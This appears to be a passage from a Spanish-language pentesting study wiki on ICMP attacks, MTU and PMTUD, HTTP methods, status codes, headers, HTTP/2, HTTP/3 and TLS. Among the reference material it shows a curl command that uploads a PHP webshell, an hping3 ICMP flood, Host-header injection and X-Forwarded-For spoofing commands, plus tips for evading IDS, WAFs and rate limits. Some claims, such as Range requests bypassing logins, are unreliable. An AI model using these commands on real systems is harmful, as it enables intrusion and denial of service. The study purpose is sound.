- El tráfico parece ping normal, pero lleva datos (SSH, HTTP, cualquier protocolo)
- Detección: tamaño inusual de paquetes ICMP, frecuencia anormal, payload no estándar

**ICMP Redirect Attack:**
- Un router legítimo envía ICMP Redirect para decirle a un host que use otra ruta (más óptima)
- Un atacante puede falsificar ICMP Redirect para redirigir tráfico
- Sistemas modernos ignoran ICMP Redirect por seguridad (net.ipv4.conf.all.accept_redirects = 0)
- Pero sigue funcionando en configuraciones mal hechas o sistemas [legacy](../raw/l3g4cy-3nt3rpr1s3.md)

**Smurf Attack ([legacy](../raw/l3g4cy-3nt3rpr1s3.md), pero concepto importante):**
- Enviar ICMP Echo Request con src IP falsificada (la IP de la víctima) a la dirección broadcast de una red
- Todos los hosts en esa red responden a la víctima
- Amplificación: 1 paquete → N respuestas (N = hosts en la red)
- Ejemplo: 1 paquete de 64 bytes → 100 respuestas de 64 bytes = amplificación 100x
- Hoy no funciona porque los routers no forwardean broadcast (cisco: `no ip directed-broadcast`)
- Conceptualmente evolucionó a los **DDoS amplification attacks** actuales (NTP, DNS, Memcached)

**ICMP Flood (DoS):**
- Enviar toneladas de ICMP Echo Request a un host
- Consume CPU y ancho de banda
- `hping3 --icmp --flood 192.168.1.100`
- Mitigación: rate limiting de ICMP en el firewall

**ICMP en pentesting (OS fingerprinting):**
- Podés determinar el SO por:
  - TTL inicial (Linux=64, Windows=128, Cisco=255)
  - Tamaño del paquete ICMP
  - Comportamiento de fragmentación
  - Valores del campo ID (algunos SO usan patrones)
- `nmap -O` usa ICMP como parte del OS fingerprinting

### MTU, Fragmentación, MSS y PMTU Discovery

#### MTU (Maximum Transmission Unit)

Es el tamaño máximo de un paquete (capa 3) que puede transmitirse por un enlace sin fragmentar.

**MTUs típicas:**
| Medio | MTU | Notas |
|-------|-----|-------|
| Ethernet | 1500 | El estándar universal |
| Ethernet Jumbo | 9000 | Redes de storage/datacenter |
| PPPoE | 1492 | ADSL, fibra con PPPoE |
| WiFi (802.11) | 2304 | Tamaño máximo MSDU |
| Token Ring | 4464 | Obsoleto |
| FDDI | 4352 | Obsoleto |
| Loopback | 65536 | Linux loopback |
| IPv6 mínimo | 1280 | Todas las redes IPv6 deben soportar esta MTU |
| PPP (serial) | 296 | Enlaces seriales viejos, SLIP |

**Problemas de MTU en hacking:**
- **MTU mismatch:** Si un router tiene MTU 1500 y otro 1492, los paquetes de 1500 se fragmentan o descartan
- **ICMP blocking rompe PMTUD:** Si bloquean ICMP type 3 code 4, la PMTUD no funciona
- **Path MTU menor que esperada:** Causa conectividad intermitente (páginas que cargan a veces sí, a veces no)
- **Jumbo frames (9000):** Si los habilitás en un segmento, aumentás eficiencia pero podés tener problemas si alguien en el camino no soporta

#### MSS (Maximum Segment Size)

MSS es el tamaño máximo de datos TCP (sin headers IP ni TCP) en un segmento.

```
MSS = MTU - IP Header - TCP Header
MSS = 1500 - 20 - 20 = 1460 (para Ethernet estándar)
```

**Negociación MSS:**
- Se negocia en el handshake TCP (opción MSS en SYN y SYN-ACK)
- Cada lado anuncia su propio MSS (pueden ser diferentes)
- Si no se anuncia MSS, se asume 536 (el mínimo)

**MSS tuning en hacking:**
- Si hay problemas de MTU, podés forzar MSS más bajo
- `iptables -A FORWARD -p tcp --tcp-flags SYN,RST SYN -j TCPMSS --clamp-mss-to-pmtu`
- En conexiones PPPoE: MSS = 1492 - 40 = 1452
- En [vpn](../raw/4n0n1m4t0.md#vpn) con encapsulación (IPSec, OpenVPN): MSS más bajo por overhead extra
- **MSS manipulation:** en un MITM, podés reducir el MSS para forzar fragmentación y evadir IDS

#### PMTU Discovery (Path MTU Discovery)

Proceso para determinar la MTU más pequeña en el camino entre origen y destino.

**Cómo funciona (RFC 1191 para IPv4, RFC 8201 para IPv6):**

1. El origen envía un paquete del tamaño de la MTU de su interfaz con DF=1
2. Si un router no puede forwardearlo porque es más grande que la MTU del próximo enlace:
   - IPv4: Devuelve ICMP Type 3 Code 4 (Fragmentation Needed and DF set), con la MTU del enlace
   - IPv6: Devuelve ICMPv6 Type 2 (Packet Too Big), con la MTU del enlace
3. El origen reduce su tamaño a la MTU informada
4. Repite hasta que el paquete llega

**Problemas de seguridad con PMTUD:**
- Muchos firewalls bloquean ICMP → PMTUD no funciona
- Conexiones "zombie": algunos servidores se quedan atascados esperando ICMP
- **Ataque PMTUD:** Podés enviar ICMP Type 3 Code 4 falsificado con MTU chica, haciendo que el servidor use segmentos diminutos, degradando performance
- **ICMP Type 3 Code 4 spoofing:** Si podés spoofear un origen legítimo, hacés que la conexión se degrade

**MSS Clamping:**
- Solución para redes donde ICMP de PMTUD está bloqueado
- El router/firewall modifica el MSS anunciado en los SYN
- `iptables -t mangle -A FORWARD -p tcp --tcp-flags SYN,RST SYN -j TCPMSS --clamp-mss-to-pmtu`
- Ajusta MSS a un valor que funcione sin necesidad de PMTUD

**Herramientas para testear MTU:**
- `ping -f -l <size>` (Windows): Envía ping con DF=1 y tamaño específico
- `ping -M do -s <size>` (Linux): Ídem
- `tracepath`: Incluye MTU discovery automático
- `nmtu`: Herramienta dedicada para descubrir MTU

### Valores por Defecto de TCP/IP en SO

| Parámetro | Linux | Windows | macOS |
|-----------|-------|---------|-------|
| TTL inicial | 64 | 128 | 64 |
| MSS anunciado | 1460 | 1460 | 1460 |
| RWIN (ventana) | 28960-65535 | 65535-262144 | 65535 |
| Window Scaling | Sí | Sí | Sí |
| Timestamps | Sí | Sí | Sí |
| SACK | Sí | Sí | Sí |
| PMTUD | Sí | Sí | Sí |
| ISN | Aleatorio (RFC 6528) | Aleatorio | Aleatorio |
| DF inicial | 0 (permite fragmentación) | 1 (Don't Fragment) | 0 |

Saber estos valores ayuda a identificar el SO en un escaneo pasivo (por ejemplo, viendo TTL en Wireshark).

---

## [http](../raw/r3d3s-f0nd4m3nt0s.md#http)/[https](../raw/r3d3s-f0nd4m3nt0s.md#https)

### HTTP (HyperText Transfer Protocol)

HTTP es el [protocolo](../raw/r3d3s-f0nd4m3nt0s.md#protocolos-de-red)) de aplicación que hace funcionar la web. Es el [protocolo](../raw/r3d3s-f0nd4m3nt0s.md#protocolos-de-red) que usa tu [navegador](../raw/br0ws3r-3xpl01t4t10n.md) para pedir páginas web.

**Características:**
- Protocolo de capa 7 (aplicación)
- Modelo cliente-servidor
- Sin estado (stateless) — cada request es independiente
- Texto plano (legible por humanos)
- Corre sobre [tcp](../raw/r3d3s-f0nd4m3nt0s.md#tcp) (comúnmente [puerto](../raw/r3d3s-f0nd4m3nt0s.md#puertos) 80)
- Versiones: 0.9, 1.0, 1.1, 2, 3

**Estructura de un mensaje HTTP:**

**Request:**
```
<METHOD> <URI> <HTTP_VERSION>
<Header>: <value>
<Header>: <value>

<body>
```

**Response:**
```
<HTTP_VERSION> <STATUS_CODE> <REASON_PHRASE>
<Header>: <value>
<Header>: <value>

<body>
```

**Ejemplo HTTP Request (GET):**
```
GET /index.html HTTP/1.1
Host: www.google.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.9,es;q=0.8
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

```

**Ejemplo HTTP Response:**
```
HTTP/1.1 200 OK
Date: Mon, 23 May 2026 12:00:00 GMT
Server: gws
Content-Type: text/html; charset=UTF-8
Content-Length: 12345
Set-Cookie: NID=abc123; Domain=.google.com; Path=/; Expires=Tue, 23-May-2027 12:00:00 GMT
Cache-Control: private, max-age=0

<!doctype html><html>...
```

### HTTP Methods (Verb HTTP)

Son las acciones que el cliente puede solicitar. La especificación original (HTTP/1.0) definía GET, HEAD y POST. HTTP/1.1 agregó más.

| Method | Safe? | Idempotent? | Cacheable? | Descripción |
|--------|-------|-------------|------------|-------------|
| GET | Sí | Sí | Sí | Recuperar un recurso |
| HEAD | Sí | Sí | Sí | Como GET pero sin body (solo headers) |
| POST | No | No | No | Enviar datos al servidor (crear recurso) |
| PUT | No | Sí | No | Reemplazar un recurso (crear o actualizar) |
| PATCH | No | No | No | Modificar parcialmente un recurso |
| DELETE | No | Sí | No | Eliminar un recurso |
| OPTIONS | Sí | Sí | No | Preguntar qué métodos soporta el servidor |
| CONNECT | No | No | No | Establecer un túnel (usado en proxies) |
| TRACE | Sí | Sí | No | Echo de vuelta el request (debug, peligroso) |

**Safe:** No modifica el recurso en el servidor. GET, HEAD, OPTIONS, TRACE son seguros.
**Idempotent:** Si hacés el mismo request 1 vez o 100, el resultado en el servidor es el mismo.
**Cacheable:** El resultado se puede cachear. GET y HEAD son cacheables.

**Métodos peligrosos para un pentester:**

**PUT:** Si un servidor web tiene PUT habilitado sin autenticación, podés subir un webshell.
```bash
curl -X PUT -d '<?php system($_GET["cmd"]); ?>' http://target/uploads/shell.php
```

**DELETE:** Si está habilitado, podés borrar recursos del servidor.
```bash
curl -X DELETE http://target/api/users/1
```

**TRACE:** Si está habilitado, revela headers internos (incluyendo cabeceras de autenticación). Se usa en ataques XST (Cross-Site Tracing).
```bash
curl -X TRACE http://target/ -v
```

**OPTIONS:**
```bash
curl -X OPTIONS http://target/ -i
# Devuelve: Allow: GET, POST, PUT, DELETE, OPTIONS, HEAD
```

**PATCH vs PUT:**
- PUT: Reemplazá TODO el recurso
- PATCH: Aplicá cambios parciales (partial update)
- PUT es idempotente, PATCH no necesariamente
### HTTP Status Codes

Divididos en 5 clases:

#### 1xx — Informational

| Code | Phrase | Significado |
|------|--------|-------------|
| 100 | Continue | El servidor recibió los headers, el cliente puede seguir con el body |
| 101 | Switching Protocols | El servidor acepta cambiar a otro protocolo (Upgrade → WebSocket) |
| 102 | Processing | Servidor procesando (WebDAV) |
| 103 | Early Hints | Servidor sugiere recursos para pre-cargar mientras procesa |

**100 Continue en hacking:** Útil para time-based attacks. Si el servidor soporta 100 Continue, podés enviar headers y esperar el 100 antes de mandar el body. Si no lo soporta, el body se envía igual. Se usa para evadir WAFs (el WAF espera el body completo pero el servidor ya empezó a procesar).

#### 2xx — Success

| Code | Phrase | Significado |
|------|--------|-------------|
| 200 | OK | Request exitoso. Depende del método: GET → recurso en body, POST → resultado |
| 201 | Created | Recurso creado exitosamente (POST, PUT). Location header contiene la URL |
| 202 | Accepted | Request aceptado para procesamiento asíncrono |
| 203 | Non-Authoritative Info | Respuesta de un [proxy](../raw/r3d3s-f0nd4m3nt0s.md#proxy), puede no ser la original del servidor |
| 204 | No Content | Request exitoso pero sin contenido que devolver (DELETE exitoso) |
| 205 | Reset Content | Como 204 pero el cliente debe resetear la vista del documento |
| 206 | Partial Content | Respuesta parcial (sirve rangos de bytes, descargas reanudables) |
| 207 | Multi-Status | Múltiples status codes en un body XML (WebDAV) |
| 208 | Already Reported | Miembros de un binding ya listados (DAV) |
| 226 | IM Used | El servidor usó manipulación de instancia (Delta encoding) |

**206 Partial Content:** Sirve rangos de bytes. `curl -H "Range: bytes=0-1000" http://...`. Útil para bypassear login pages (a veces el contenido protegido está en los primeros bytes, pero si pedís desde el byte 5000 saltás el login).

#### 3xx — Redirection

| Code | Phrase | Significado |
|------|--------|-------------|
| 300 | Multiple Choices | Múltiples representaciones del recurso |
| 301 | Moved Permanently | El recurso se movió permanentemente a la URL en Location |
| 302 | Found | El recurso está temporalmente en otra URL |
| 303 | See Other | El recurso está en otra URL, debe pedirse con GET |
| 304 | Not Modified | El recurso no cambió (usando If-Modified-Since o ETag) |
| 307 | Temporary Redirect | Como 302 pero el método no cambia |
| 308 | Permanent Redirect | Como 301 pero el método no cambia |

**301 vs 302 vs 307 vs 308:**
- **301:** Permanente. El browser cambia el bookmark. POST → GET (pierde el body).
- **302:** Temporal. POST → GET (pierde el body).
- **307:** Temporal. POST → POST (conserva body y método).
- **308:** Permanente. POST → POST (conserva body y método).

**302 en hacking:** Muy usado en bypass de autenticación. Un sitio que redirige con 302 a /login después de login exitoso puede tener la página protegida accesible por [fuerza bruta](../raw/p4ssw0rd-4tt4cks.md#fuerza-bruta) de URLs.

**304 Not Modified:** El recurso en cache local es válido. El header `If-Modified-Since` o `If-None-Match` (ETag) se usa. El servidor responde 304 sin body. Ahorra ancho de banda.

#### 4xx — Client Error

| Code | Phrase | Significado |
|------|--------|-------------|
| 400 | Bad Request | El servidor no entiende el request (syntax error) |
| 401 | Unauthorized | Requiere autenticación (WWW-Authenticate header) |
| 402 | Payment Required | Reservado para uso futuro (pago digital) |
| 403 | Forbidden | Autenticado pero sin [permisos](../raw/0s-f0nd4m3nt0s.md#permisos) |
| 404 | Not Found | El recurso no existe |
| 405 | Method Not Allowed | El método HTTP no está soportado para esa URL |
| 406 | Not Acceptable | El servidor no puede producir contenido que coincida con Accept |
| 407 | Proxy Authentication Required | El proxy requiere autenticación |
| 408 | Request Timeout | El servidor cerró la conexión por inactividad |
| 409 | Conflict | Conflicto con el estado actual del recurso |
| 410 | Gone | El recurso ya no está disponible (permanente, no temporal) |
| 411 | Length Required | Content-Length requerido |
| 412 | Precondition Failed | Una precondición del header falló |
| 413 | [payload](../raw/m3t4spl01t.md#payloads) Too Large | Body demasiado grande |
| 414 | URI Too Long | URI demasiado larga (ataque de [buffer overflow](../raw/pr0gr4mm1ng-f0nd4m3nt0s.md#buffer-overflow) en algunos servers viejos) |
| 415 | Unsupported Media Type | Formato de body no soportado |
| 416 | Range Not Satisfiable | Rango de bytes inválido |
| 417 | Expectation Failed | El valor del header Expect no puede ser cumplido |
| 418 | I'm a Teapot | El servidor rechaza intentar café con una tetera (RFC 2324, April Fools) |
| 421 | Misdirected Request | Request enviado a un servidor que no puede [responder](../raw/w1nd0ws-p0st3xpl01t.md#responder) |
| 422 | Unprocessable Entity | El cuerpo está bien formado pero semánticamente inválido |
| 423 | Locked | El recurso está bloqueado (WebDAV) |
| 424 | Failed Dependency | El request falló por un error en un request anterior (WebDAV) |
| 425 | Too Early | El servidor no quiere procesar un request que podría ser replay (0-RTT) |
| 426 | Upgrade Required | El cliente debe cambiar de protocolo (ej: [tls](../raw/r3d3s-f0nd4m3nt0s.md#ssl-tls)) |
| 428 | Precondition Required | El servidor requiere condicional (If-Match) |
| 429 | Too Many Requests | [rate limiting](../raw/4p1-s3cur1ty.md#rate-limiting) — el cliente excedió la cuota |
| 431 | Request Header Fields Too Large | Headers muy grandes |
| 451 | Unavailable For Legal Reasons | El recurso fue bloqueado por razones legales (censura) |

**401 vs 403 — Diferencia clave en pentesting:**
- **401:** No estás autenticado. El servidor no sabe quién sos. Te dice "identificate".
- **403:** Estás autenticado pero no tenés permiso. El servidor sabe quién sos y te dice "no, vos no".

Esto es clave para enumeración. Si un admin.php da 401, no sabés si existe o no. Si da 403, SABÉS que existe porque pasó la autenticación.

**404 vs 403 en directory enumeration:**
- **404:** El archivo/directorio probablemente no existe
- **403:** El archivo/directorio EXISTE pero no tenés acceso

**418 I'm a Teapot:** Es un chiste de April Fools (RFC 2324). Algunas APIs lo implementan de verdad como easter egg.

**429 Too Many Requests:** Rate limiting activo. Si lo ves, tenés que ralentizar tu [fuzzing](../raw/fuzz1ng.md) o usar [ips](../raw/s3c-f0nd4m3nt0s.md#ids-ips) rotativas.

**451 Unavailable For Legal Reasons:** El recurso fue censurado. Creado por el EFF para indicar bloqueos gubernamentales.

#### 5xx — Server Error

| Code | Phrase | Significado |
|------|--------|-------------|
| 500 | Internal Server Error | Error genérico del servidor (el más común en exploits) |
| 501 | Not Implemented | El método no está implementado |
| 502 | Bad Gateway | El servidor es proxy/gateway y recibió respuesta inválida del upstream |
| 503 | Service Unavailable | Servidor temporalmente sobrecargado o en mantenimiento |
| 504 | Gateway Timeout | El upstream no respondió a tiempo |
| 505 | HTTP Version Not Supported | El servidor no soporta la versión de HTTP usada |
| 506 | Variant Also Negotiates | Error de negociación de contenido |
| 507 | Insufficient Storage | No hay espacio en disco (WebDAV) |
| 508 | Loop Detected | El servidor detectó un loop infinito (WebDAV) |
| 510 | Not Extended | Se requieren extensiones adicionales |
| 511 | Network Authentication Required | Se requiere autenticarse en la [red](../raw/r3d3s-f0nd4m3nt0s.md) (captive portal) |

**500 en hacking:** Un error 500 en un endpoint que normalmente responde 200 puede indicar que encontraste una [vulnerabilidad](../raw/s3c-f0nd4m3nt0s.md#vulnerabilidades) ([sql injection](../raw/w3b-h4ck1ng.md#sql-injection) que rompió la query, [command injection](../raw/w3b-h4ck1ng.md#command-injection), file inclusion con archivo inexistente, deserialization que explotó).

**502/503/504:** Problemas de infraestructura. En un [ctf](../raw/ctf-h4ckth3b0x.md), podés causar esto a propósito para revelar información en error messages.

**511:** Clásico de aeropuertos/hoteles con captive portal. El browser te redirige automáticamente a la página de login.

### HTTP Headers

Los headers HTTP son metadatos enviados en ambas direcciones. Existen headers de request, de response, y generales (en ambos sentidos).

#### Request Headers (Cliente → Servidor)

| Header | Ejemplo | Descripción |
|--------|---------|-------------|
| Host | `Host: www.google.com` | OBLIGATORIO en HTTP/1.1. El dominio al que se envía el request |
| User-Agent | `User-Agent: Mozilla/5.0 ...` | Identifica el cliente (navegador, herramienta, bot) |
| Accept | `Accept: text/html, application/json` | Tipos de contenido que el cliente acepta |
| Accept-Language | `Accept-Language: es-AR, en;q=0.9` | Idiomas preferidos (q = calidad/prioridad) |
| Accept-Encoding | `Accept-Encoding: gzip, deflate, br` | Compresiones aceptadas (br = Brotli) |
| Connection | `Connection: keep-alive` | Control de conexión (keep-alive vs close vs upgrade) |
| Referer | `Referer: https://google.com/` | URL de la que venís (pérdida de privacidad, peligro) |
| Authorization | `Authorization: Basic dXNlcjpwYXNz` | Credenciales (Basic, Bearer, Digest, Negotiate) |
| Cookie | `Cookie: session=abc123; token=xyz` | Cookies del sitio |
| Origin | `Origin: https://evil.com` | Origen del request (CORS) |
| Content-Type | `Content-Type: application/x-www-form-urlencoded` | Tipo del body |
| Content-Length | `Content-Length: 123` | Tamaño del body en bytes |
| Cache-Control | `Cache-Control: no-cache` | Directivas de cache |
| Upgrade-Insecure-Requests | `Upgrade-Insecure-Requests: 1` | Prefiere HTTPS (CSP) |
| DNT | `DNT: 1` | Do Not Track (obsoleto, reemplazado por GPC) |
| X-Forwarded-For | `X-Forwarded-For: 192.168.1.5` | [ip](../raw/r3d3s-f0nd4m3nt0s.md#direccionamiento-ip) real del cliente tras un proxy |
| X-Real-IP | `X-Real-IP: 192.168.1.5` | Similar a X-Forwarded-For (nginx) |
| Forwarded | `Forwarded: for=192.168.1.5;proto=https` | Estandarización de X-Forwarded-For (RFC 7239) |
| If-Modified-Since | `If-Modified-Since: Mon, 23 May 2025 12:00:00 GMT` | Cache condicional |
| If-None-Match | `If-None-Match: "abc123"` | Cache condicional con ETag |
| Range | `Range: bytes=0-1024` | Solicita solo parte del recurso (partial content) |
| Expect | `Expect: 100-continue` | Esperar 100 Continue antes de mandar body |

**User-Agent en pentesting:**
- Podés cambiar el User-Agent para evadir detección o imitar un navegador específico
- Algunas apps bloquean ciertos User-Agents (ej: curl, [python](../raw/pyth0n-f0r-h4ck1ng.md)-requests)
- `curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" http://target/`

**Host Header Injection:**
- Si el header Host no se valida correctamente, podés hacer ataques como:
  - Password reset poisoning (el link de reset se genera con el Host que vos pongas)
  - Cache poisoning (si el cache usa Host como clave)
  - [ssrf](../raw/w3b-h4ck1ng.md#ssrf) (Virtual Host Routing)
```bash
curl -H "Host: evil.com" http://target/
```

**X-Forwarded-For Spoofing:**
- Algunas aplicaciones restringen acceso por IP usando X-Forwarded-For
- Podés bypassearlo:
```bash
curl -H "X-Forwarded-For: 127.0.0.1" http://target/admin
curl -H "X-Forwarded-For: 192.168.1.1" http://target/internal
```

**Authorization Header:**
Tipos comunes:
- **Basic:** `base64(user:pass)` — inseguro, se decodifica al toque
- **Bearer:** token [jwt](../raw/4p1-s3cur1ty.md#jwt) (JSON Web Token)
- **Digest:** MD5 del password + nonce + etc (más seguro que Basic)
- **Negotiate:** Kerberos/NTLM en entornos Windows (SPNEGO)
```bash
# Basic Auth
curl -u "admin:password" http://target/
# Internamente envía: Authorization: Basic YWRtaW46cGFzc3dvcmQ=

# Bearer Token
curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9..." http://target/
```

#### Response Headers (Servidor → Cliente)

| Header | Ejemplo | Descripción |
|--------|---------|-------------|
| Content-Type | `Content-Type: text/html; charset=utf-8` | Tipo MIME del contenido |
| Content-Length | `Content-Length: 12345` | Tamaño del body en bytes |
| Content-Encoding | `Content-Encoding: gzip` | Compresión usada |
| Server | `Server: nginx/1.24.0` | Información del servidor (fingerprinting) |
| [set](../raw/ph1sh1ng.md#social-engineering-toolkit)-Cookie | `Set-Cookie: session=abc123; HttpOnly` | El servidor establece una cookie |
| Location | `Location: https://target/login` | URL de redirección (con 3xx) |
| Cache-Control | `Cache-Control: no-store, must-revalidate` | Política de cache |
| Expires | `Expires: Thu, 01 Dec 2025 16:00:00 GMT` | Fecha de expiración para cache |
| ETag | `ETag: "abc123"` | Identificador de versión del recurso |
| Last-Modified | `Last-Modified: Mon, 22 May 2025 12:00:00 GMT` | Fecha de última modificación |
| WWW-Authenticate | `WWW-Authenticate: Basic realm="Admin"` | Desafío de autenticación (401) |
| Allow | `Allow: GET, POST, HEAD` | Métodos permitidos |
| Access-Control-Allow-Origin | `Access-Control-Allow-Origin: *` | CORS (permite cross-origin) |
| Strict-Transport-Security | `Strict-Transport-Security: max-age=31536000` | HSTS — solo HTTPS |
| X-Frame-Options | `X-Frame-Options: DENY` | Previene clickjacking |
| X-Content-Type-Options | `X-Content-Type-Options: nosniff` | Previene MIME sniffing |
| X-[xss](../raw/w3b-h4ck1ng.md#xss)-Protection | `X-XSS-Protection: 1; mode=block` | Anti-XSS (obsoleto en Chrome) |
| Content-Security-Policy | `Content-Security-Policy: default-src 'self'` | CSP: controla qué recursos se cargan |
| Referrer-Policy | `Referrer-Policy: no-referrer` | Cuándo enviar el header Referer |
| Access-Control-Allow-Credentials | `Access-Control-Allow-Credentials: true` | CORS |

**Server Header:** Revela información valiosa para un atacante. Buenas prácticas: no exponer versiones exactas. Un pentester lo usa para identificar posibles CVEs.
```bash
curl -I http://target/
# HTTP/1.1 200 OK
# Server: Apache/2.4.49 (Unix)  ← ¡vulnerable a CVE-2021-41773!
```

**Strict-Transport-Security (HSTS):**
```bash
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```
- Le dice al navegador: "Siempre usá HTTPS para este dominio"
- Evita [ssl](../raw/r3d3s-f0nd4m3nt0s.md#ssl-tls) stripping (ataque donde un [mitm](../raw/m1tm-m0b1l3.md) baja HTTPS a HTTP)
- `max-age`: tiempo en segundos (31536000 = 1 año)
- `includeSubDomains`: aplica a todos los subdominios
- `preload`: para ser incluido en la lista pre-cargada de navegadores (hardcodeada)

**Content-Security-Policy (CSP):**
Es el mecanismo más moderno para prevenir XSS. Controla qué recursos puede cargar la página.
```bash
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.jsdelivr.net; style-src 'self' 'unsafe-inline'; img-src *;
```
Directivas comunes:
- `default-src`: fallback para todo si no hay directiva específica
- `script-src`: fuentes de JS permitidas
- `style-src`: fuentes de CSS permitidas
- `img-src`: fuentes de imágenes permitidas
- `connect-src`: fuentes para fetch(), XHR, WebSocket
- `frame-src`: fuentes para iframes
- `object-src`: fuentes para plugins (Flash, Java)
- `base-uri`: URLs permitidas para el tag `<base>`
- `form-action`: destinos permitidos para formularios

Valores especiales:
- `'none'`: no permitir nada
- `'self'`: mismo origen
- `'unsafe-inline'`: permitir código inline (peligroso, rompe la protección XSS)
- `'unsafe-eval'`: permitir eval() (peligroso)
- `'strict-dynamic'`: confianza propagada (más seguro para apps modernas)
- `nonce-xyz123`: solo scripts con ese nonce (más seguro)
- `sha256-abc...`: solo scripts cuyo [hash](../raw/crypt0-f0r-h4ck3rs.md#hash-functions) coincida (muy seguro)

**X-Frame-Options:**
- `DENY`: no puede estar en un iframe NUNCA
- `SAMEORIGIN`: solo en iframes del mismo origen
- Previene clickjacking (UI redressing)
- Reemplazado parcialmente por CSP's `frame-ancestors`

### HTTP/2

HTTP/2 (lanzado en 2015, RFC 7540, actualizado por RFC 9113) es una revisión importante del protocolo HTTP.

**Diferencias clave con HTTP/1.1:**

| Característica | HTTP/1.1 | HTTP/2 |
|---------------|----------|--------|
| Formato | Texto plano (ASCII) | Binario |
| Multiplexing | No (pipelining limitado) | Sí (múltiples streams en una conexión) |
| Headers | Sin comprimir (texto plano) | Comprimidos (HPACK) |
| Server Push | No | Sí (deprecado en Chrome) |
| Prioritización | No | Sí (stream priority) |
| Conexiones | Múltiples (6 por dominio típicamente) | Una sola conexión |
| HOL Blocking | Sí (cabeza de línea) | No (solo dentro del stream) |
| Negotiation | N/A | ALPN (TLS) o Upgrade HTTP (h2c) |

#### HPACK — Header Compression

HTTP/1.1 envía headers en texto plano en cada request (cientos de bytes repetidos). HTTP/2 comprime los headers con HPACK, que combina:
1. **Tabla estática:** Headers comunes (method, path, scheme, status, content-type) tienen índices fijos (0-60)
2. **Tabla dinámica:** Headers personalizados se agregan y referencian por índice
3. **Huffman coding:** Comprime strings basado en frecuencias

Esto reduce drásticamente el overhead. Un request HTTP/1.1 puede tener 600+ bytes de headers. HTTP/2 puede reducirlo a <100 bytes.

#### Multiplexing

HTTP/1.1 tiene Head-of-Line (HOL) blocking: si un request es lento, los que siguen esperan. Pipelining lo mejora pero sigue limitado (respuestas deben volver en orden).

HTTP/2 permite enviar múltiples streams en paralelo sobre la misma conexión TCP. Cada stream es independiente y tiene su propio ID. El servidor responde en cualquier orden.

```
HTTP/1.1:
[request 1][response 1][request 2][response 2][request 3][response 3]
→ secuencial

HTTP/2:
[- stream 1 (request) -][- stream 3 (request) -]
[- stream 2 (request) -][-- stream 1 (response) --]
[- stream 2 (response) -]
→ concurrente en la misma conexión TCP
```

#### Server Push

El servidor puede enviar recursos antes de que el cliente los pida. Si el cliente pide `index.html`, el servidor sabe que va a necesitar `style.css` y `script.js`, y los envía automáticamente (push promise).

El cliente puede cancelar un push enviando RST_STREAM.

**Problemas con Server Push:**
- Chrome lo deprecó (mala eficiencia en la práctica)
- Puede ser usado para tracking (el servidor sabe qué recursos aceptás o rechazás)
- Push puede enviar recursos que el cliente ya tiene en caché (desperdicio de ancho de banda)

#### ALPN (Application-Layer Protocol Negotiation)

HTTP/2 se negocia durante el [handshake](../raw/w1f1-4tt4cks.md#handshake) TLS usando ALPN:
- Cliente envía lista de protocolos en el ClientHello (extension ALPN)
- Servidor elige uno en el ServerHello

```bash
# Verificar si un servidor soporta HTTP/2
openssl s_client -connect target.com:443 -alpn "h2,http/1.1" < /dev/null
```

Si es HTTP/2 "plano" (sin TLS, raro), se negocia con Upgrade: h2c.

### HTTP/3

HTTP/3 (RFC 9114, 2022) es la próxima generación. Cambia todo: en vez de TCP + TLS, usa **QUIC** (sobre [udp](../raw/r3d3s-f0nd4m3nt0s.md#udp)).

**QUIC (Quick UDP Internet Connections):**
- Desarrollado por Google (originalmente "QUIC" en 2012)
- Estandarizado como RFC 9000, 9001, 9002
- Corre sobre UDP (puerto 443)
- Integra TLS 1.3 directamente (no hay TCP + TLS aparte)
- 0-RTT handshake (en conexiones ya conocidas)
- Multiplexing real sin HOL blocking (en TCP, si se pierde un paquete, TODO espera; en QUIC, solo el stream afectado)
- Connection migration: podés cambiar de [wifi](../raw/w1f1-4tt4cks.md) a datos móviles sin cortar la conexión
- [cifrado](../raw/s3c-f0nd4m3nt0s.md#cifrado) nativo: todo el tráfico QUIC está [cifrado](../raw/s3c-f0nd4m3nt0s.md#cifrado) (incluso los frames de control)

**HTTP/3 vs HTTP/2:**
| Característica | HTTP/2 | HTTP/3 |
|---------------|--------|--------|
| Transporte | TCP | QUIC (UDP) |
| Cifrado | TLS aparte (capa extra) | Integrado (TLS 1.3 nativo) |
| HOL Blocking | TCP-level HOL (pérdida de 1 paquete bloquea todos los streams) | Sin HOL (por stream independiente) |
| Handshake | 2 RTT (TCP + TLS 1.3) | 1 RTT (0-RTT para conocidos) |
| Connection Migration | No (cambiar IP corta TCP) | Sí (conexión sobrevive cambio de IP) |
| Adopción | ~40% de sitios (lento pero constante) | ~30% y creciendo rápido |

**0-RTT (Zero Round-Trip Time):**
- Si ya te conectaste antes (session ticket cached), podés enviar datos en el primer paquete
- El ClientHello ya lleva datos de aplicación
- Riesgo: **replay attacks** (un atacante captura el paquete 0-RTT y lo reenvía)
- Mitigación: servidores no deben procesar requests 0-RTT que tengan side effects (POST, DELETE)

**Para el pentester:**
- HTTP/3 usa UDP 443 → no pasa por firewalls que solo miran TCP
- QUIC puede bypassear NAC (Network Access Control) y captive portals
- El tráfico QUIC siempre está cifrado (no hay texto plano como en HTTP/1.1)
- Herramientas como `quicly` o `nghttp3` para testear
- [wireshark](../raw/r3d3s-f0nd4m3nt0s.md#wireshark) puede decodificar QUIC desde las versiones recientes (necesita logging de claves)

### HTTPS / TLS

HTTPS es HTTP sobre TLS (anteriormente SSL). El puerto estándar es 443.

HTTP se envía cifrado dentro de la conexión TLS. El contenido viaja protegido contra eavesdropping (no se puede leer) y tampering (no se puede modificar sin detectar).

#### TLS 1.2 Handshake (en detalle):

```
CLIENTE                                SERVIDOR
   |                                      |
   |--- ClientHello --------------------->|
   |   Supported Ciphers:                 |
   |   TLS_ECDHE_RSA_WITH_AES_128_GCM_... |
   |   TLS Version: 1.2                   |
   |   Random: ClientHello.random         |
   |   Session ID (si reanudando)         |
   |   Extensions: SNI, ALPN, etc.        |
   |                                      |
   |<-- ServerHello --------------------- |
   |   Chosen Cipher: ...                 |
   |   Random: ServerHello.random         |
   |   Session ID                         |
   |                                      |
   |<-- Certificate --------------------- |
   |   Server's X.509 certificate chain   |
   |   (leaf -> intermediate -> root)     |
